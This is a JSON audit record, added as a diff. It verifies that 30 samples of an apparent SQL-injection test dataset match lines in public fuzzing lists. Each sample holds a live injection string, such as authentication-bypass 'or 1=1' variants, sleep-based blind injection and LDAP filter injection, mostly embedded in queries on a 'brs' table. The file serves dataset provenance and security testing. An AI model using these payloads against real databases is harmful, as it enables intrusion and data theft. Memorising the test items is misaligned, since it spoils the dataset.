@@ -1,0 +1,333 @@
+{
+  "audit_date": "2026-10-15T06:00:55.415Z",
+  "sample_size": 30,
+  "exact_matches": 30,
+  "upstream_sources": [
+    {
+      "name": "quick-SQLi.txt",
+      "url": "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/Databases/SQLi/quick-SQLi.txt",
+      "sha256": "99301faba9413833c02cf9d74a5a32a06482aea5b373f8e843edbca3ca2b0b7e",
+      "byte_count": 1180,
+      "retrieval_date": "2026-10-15",
+      "status": "FETCH_SUCCESS"
+    },
+    {
+      "name": "Generic-SQLi.txt",
+      "url": "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/Databases/SQLi/Generic-SQLi.txt",
+      "sha256": "09e5930609e4ce0663505168432796881f493ec0e63643300166d36ed57d40ec",
+      "byte_count": 5383,
+      "retrieval_date": "2026-10-15",
+      "status": "FETCH_SUCCESS"
+    },
+    {
+      "name": "SQLite-Injection.md",
+      "url": "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/SQL%20Injection/SQLite%20Injection.md",
+      "sha256": "f6bad93117b22ac5575260d55967cb030f2780d8dcb70f5a9a5e16e82f1dbf36",
+      "byte_count": 8703,
+      "retrieval_date": "2026-10-15",
+      "status": "FETCH_SUCCESS"
+    }
+  ],
+  "audit_samples": [
+    {
+      "id": "att_1141",
+      "provenance": "public:SQLite-Injection.md:19",
+      "claimed_file": "SQLite-Injection.md",
+      "claimed_line": 19,
+      "sql": "SELECT * FROM brs WHERE city = '* [SQLite File Manipulation](#sqlite-file-manipulation)'",
+      "actual_line_content": "* [SQLite File Manipulation](#sqlite-file-manipulation)",
+      "verified": true,
+      "match_type": "EXACT_MATCH"
+    },
+    {
+      "id": "att_0473",
+      "provenance": "public:Generic-SQLi.txt:44",
+      "claimed_file": "Generic-SQLi.txt",
+      "claimed_line": 44,
+      "sql": "SELECT * FROM brs WHERE br_id = PRINT",
+      "actual_line_content": "PRINT",
+      "verified": true,
+      "match_type": "EXACT_MATCH"
+    },
+    {
+      "id": "att_0320",
+      "provenance": "public:quick-SQLi.txt:67",
+      "claimed_file": "quick-SQLi.txt",
+      "claimed_line": 67,
+      "sql": "SELECT * FROM brs WHERE br_id = admin\" or 1=1#",
+      "actual_line_content": "admin\" or 1=1#",
+      "verified": true,
+      "match_type": "EXACT_MATCH"
+    },
+    {
+      "id": "att_0164",
+      "provenance": "public:quick-SQLi.txt:15",
+      "claimed_file": "quick-SQLi.txt",
+      "claimed_line": 15,
+      "sql": "SELECT * FROM brs WHERE br_id = \"*\"",
+      "actual_line_content": "\"*\"",
+      "verified": true,
+      "match_type": "EXACT_MATCH"
+    },
+    {
+      "id": "att_0189",
+      "provenance": "public:quick-SQLi.txt:24",
+      "claimed_file": "quick-SQLi.txt",
+      "claimed_line": 24,
+      "sql": "\") or true--",
+      "actual_line_content": "\") or true--",
+      "verified": true,
+      "match_type": "EXACT_MATCH"
+    },
+    {
+      "id": "att_0354",
+      "provenance": "public:Generic-SQLi.txt:2",
+      "claimed_file": "Generic-SQLi.txt",
+      "claimed_line": 2,
+      "sql": "%20or%201=1",
+      "actual_line_content": "%20or%201=1",
+      "verified": true,
+      "match_type": "EXACT_MATCH"
+    },
+    {
+      "id": "att_0355",
+      "provenance": "public:Generic-SQLi.txt:2",
+      "claimed_file": "Generic-SQLi.txt",
+      "claimed_line": 2,
+      "sql": "SELECT * FROM brs WHERE city = '%20or%201=1'",
+      "actual_line_content": "%20or%201=1",
+      "verified": true,
+      "match_type": "EXACT_MATCH"
+    },
+    {
+      "id": "att_0170",
+      "provenance": "public:quick-SQLi.txt:17",
+      "claimed_file": "quick-SQLi.txt",
+      "claimed_line": 17,
+      "sql": "SELECT * FROM brs WHERE br_id = \" or \"\" \"",
+      "actual_line_content": "\" or \"\" \"",
+      "verified": true,
+      "match_type": "EXACT_MATCH"
+    },
+    {
+      "id": "att_0359",
+      "provenance": "public:Generic-SQLi.txt:3",
+      "claimed_file": "Generic-SQLi.txt",
+      "claimed_line": 3,
+      "sql": "SELECT * FROM brs WHERE br_id = ; execute immediate 'sel' || 'ect us' || 'er'",
+      "actual_line_content": "; execute immediate 'sel' || 'ect us' || 'er'",
+      "verified": true,
+      "match_type": "EXACT_MATCH"
+    },
+    {
+      "id": "att_0177",
+      "provenance": "public:quick-SQLi.txt:20",
+      "claimed_file": "quick-SQLi.txt",
+      "claimed_line": 20,
+      "sql": "\" or \"\"*\"",
+      "actual_line_content": "\" or \"\"*\"",
+      "verified": true,
+      "match_type": "EXACT_MATCH"
+    },
+    {
+      "id": "att_0380",
+      "provenance": "public:Generic-SQLi.txt:10",
+      "claimed_file": "Generic-SQLi.txt",
+      "claimed_line": 10,
+      "sql": "SELECT * FROM brs WHERE br_id = delete",
+      "actual_line_content": "delete",
+      "verified": true,
+      "match_type": "EXACT_MATCH"
+    },
+    {
+      "id": "att_0208",
+      "provenance": "public:quick-SQLi.txt:30",
+      "claimed_file": "quick-SQLi.txt",
+      "claimed_line": 30,
+      "sql": "SELECT * FROM brs WHERE city = '\") or (\"x\")=(\"x'",
+      "actual_line_content": "\") or (\"x\")=(\"x",
+      "verified": true,
+      "match_type": "EXACT_MATCH"
+    },
+    {
+      "id": "att_0376",
+      "provenance": "public:Generic-SQLi.txt:9",
+      "claimed_file": "Generic-SQLi.txt",
+      "claimed_line": 9,
+      "sql": "SELECT * FROM brs WHERE city = '\"hi\"\") or (\"\"a\"\"=\"\"a\"'",
+      "actual_line_content": "\"hi\"\") or (\"\"a\"\"=\"\"a\"",
+      "verified": true,
+      "match_type": "EXACT_MATCH"
+    },
+    {
+      "id": "att_0404",
+      "provenance": "public:Generic-SQLi.txt:18",
+      "claimed_file": "Generic-SQLi.txt",
+      "claimed_line": 18,
+      "sql": "SELECT * FROM brs WHERE br_id = 1) or sleep(__TIME__)#",
+      "actual_line_content": "1) or sleep(__TIME__)#",
+      "verified": true,
+      "match_type": "EXACT_MATCH"
+    },
+    {
+      "id": "att_0417",
+      "provenance": "public:Generic-SQLi.txt:24",
+      "claimed_file": "Generic-SQLi.txt",
+      "claimed_line": 24,
+      "sql": "asc",
+      "actual_line_content": "asc",
+      "verified": true,
+      "match_type": "EXACT_MATCH"
+    },
+    {
+      "id": "att_0263",
+      "provenance": "public:quick-SQLi.txt:48",
+      "claimed_file": "quick-SQLi.txt",
+      "claimed_line": 48,
+      "sql": "SELECT * FROM brs WHERE br_id = admin') or ('1'='1",
+      "actual_line_content": "admin') or ('1'='1",
+      "verified": true,
+      "match_type": "EXACT_MATCH"
+    },
+    {
+      "id": "att_0239",
+      "provenance": "public:quick-SQLi.txt:40",
+      "claimed_file": "quick-SQLi.txt",
+      "claimed_line": 40,
+      "sql": "SELECT * FROM brs WHERE br_id = admin' or '1'='1'--",
+      "actual_line_content": "admin' or '1'='1'--",
+      "verified": true,
+      "match_type": "EXACT_MATCH"
+    },
+    {
+      "id": "att_0269",
+      "provenance": "public:quick-SQLi.txt:50",
+      "claimed_file": "quick-SQLi.txt",
+      "claimed_line": 50,
+      "sql": "SELECT * FROM brs WHERE br_id = admin') or ('1'='1'#",
+      "actual_line_content": "admin') or ('1'='1'#",
+      "verified": true,
+      "match_type": "EXACT_MATCH"
+    },
+    {
+      "id": "att_0209",
+      "provenance": "public:quick-SQLi.txt:30",
+      "claimed_file": "quick-SQLi.txt",
+      "claimed_line": 30,
+      "sql": "SELECT * FROM brs WHERE br_id = \") or (\"x\")=(\"x",
+      "actual_line_content": "\") or (\"x\")=(\"x",
+      "verified": true,
+      "match_type": "EXACT_MATCH"
+    },
+    {
+      "id": "att_0190",
+      "provenance": "public:quick-SQLi.txt:24",
+      "claimed_file": "quick-SQLi.txt",
+      "claimed_line": 24,
+      "sql": "SELECT * FROM brs WHERE city = '\") or true--'",
+      "actual_line_content": "\") or true--",
+      "verified": true,
+      "match_type": "EXACT_MATCH"
+    },
+    {
+      "id": "att_0390",
+      "provenance": "public:Generic-SQLi.txt:14",
+      "claimed_file": "Generic-SQLi.txt",
+      "claimed_line": 14,
+      "sql": "*(|(objectclass=*))",
+      "actual_line_content": "*(|(objectclass=*))",
+      "verified": true,
+      "match_type": "EXACT_MATCH"
+    },
+    {
+      "id": "att_0693",
+      "provenance": "public:Generic-SQLi.txt:123",
+      "claimed_file": "Generic-SQLi.txt",
+      "claimed_line": 123,
+      "sql": "or 0=0 #\"",
+      "actual_line_content": "or 0=0 #\"",
+      "verified": true,
+      "match_type": "EXACT_MATCH"
+    },
+    {
+      "id": "att_0157",
+      "provenance": "public:quick-SQLi.txt:13",
+      "claimed_file": "quick-SQLi.txt",
+      "claimed_line": 13,
+      "sql": "SELECT * FROM brs WHERE city = '\"&\"'",
+      "actual_line_content": "\"&\"",
+      "verified": true,
+      "match_type": "EXACT_MATCH"
+    },
+    {
+      "id": "att_0358",
+      "provenance": "public:Generic-SQLi.txt:3",
+      "claimed_file": "Generic-SQLi.txt",
+      "claimed_line": 3,
+      "sql": "SELECT * FROM brs WHERE city = '; execute immediate ''sel'' || ''ect us'' || ''er'''",
+      "actual_line_content": "; execute immediate 'sel' || 'ect us' || 'er'",
+      "verified": true,
+      "match_type": "EXACT_MATCH"
+    },
+    {
+      "id": "att_0369",
+      "provenance": "public:Generic-SQLi.txt:7",
+      "claimed_file": "Generic-SQLi.txt",
+      "claimed_line": 7,
+      "sql": "1) or pg_sleep(__TIME__)--",
+      "actual_line_content": "1) or pg_sleep(__TIME__)--",
+      "verified": true,
+      "match_type": "EXACT_MATCH"
+    },
+    {
+      "id": "att_0718",
+      "provenance": "public:Generic-SQLi.txt:132",
+      "claimed_file": "Generic-SQLi.txt",
+      "claimed_line": 132,
+      "sql": "SELECT * FROM brs WHERE city = 'having 1=1--'",
+      "actual_line_content": " having 1=1--",
+      "verified": true,
+      "match_type": "EXACT_MATCH"
+    },
+    {
+      "id": "att_0373",
+      "provenance": "public:Generic-SQLi.txt:8",
+      "claimed_file": "Generic-SQLi.txt",
+      "claimed_line": 8,
+      "sql": "SELECT * FROM brs WHERE city = '||(elt(-3+5,bin(15),ord(10),hex(char(45))))'",
+      "actual_line_content": "||(elt(-3+5,bin(15),ord(10),hex(char(45))))",
+      "verified": true,
+      "match_type": "EXACT_MATCH"
+    },
+    {
+      "id": "att_0935",
+      "provenance": "public:Generic-SQLi.txt:208",
+      "claimed_file": "Generic-SQLi.txt",
+      "claimed_line": 208,
+      "sql": "SELECT * FROM brs WHERE br_id = %2A%7C",
+      "actual_line_content": "%2A%7C",
+      "verified": true,
+      "match_type": "EXACT_MATCH"
+    },
+    {
+      "id": "att_0412",
+      "provenance": "public:Generic-SQLi.txt:22",
+      "claimed_file": "Generic-SQLi.txt",
+      "claimed_line": 22,
+      "sql": "SELECT * FROM brs WHERE city = '@var select @var as var into temp end --'",
+      "actual_line_content": "@var select @var as var into temp end --",
+      "verified": true,
+      "match_type": "EXACT_MATCH"
+    },
+    {
+      "id": "att_0827",
+      "provenance": "public:Generic-SQLi.txt:169",
+      "claimed_file": "Generic-SQLi.txt",
+      "claimed_line": 169,
+      "sql": "SELECT * FROM brs WHERE br_id = &apos;%20OR",
+      "actual_line_content": "&apos;%20OR",
+      "verified": true,
+      "match_type": "EXACT_MATCH"
+    }
+  ]
+}
